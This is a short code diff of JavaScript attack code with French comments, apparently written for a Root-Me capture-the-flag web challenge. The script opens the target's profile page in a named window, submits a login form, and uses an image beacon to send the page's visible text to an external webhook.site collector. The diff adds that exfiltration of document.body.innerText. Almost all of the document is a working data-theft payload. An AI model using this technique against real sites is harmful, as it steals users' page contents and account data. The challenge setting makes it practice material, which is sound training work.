@@ -16,14 +16,14 @@ new Image().src =
 
 // Ouvre un contexte de navigation sur la cible
 window.open(
-  "http://challenge01.root-me.org:58003/login",
+  "http://challenge01.root-me.org:58003/profile",
   "loginP"
 );
 
 // Envoie ensuite le login POST dans cette fenêtre
 setTimeout(() => {
   new Image().src =
-    "http://webhook.site/4e89d29d-56e3-4245-bff9-7a5931ba4284/?stage=submitting";
+    "http://webhook.site/4e89d29d-56e3-4245-bff9-7a5931ba4284/?stage=submitting&?a="+encodeURIComponent(document.body.innerText);
 
   document.getElementById("f").submit();
 }, 3000);
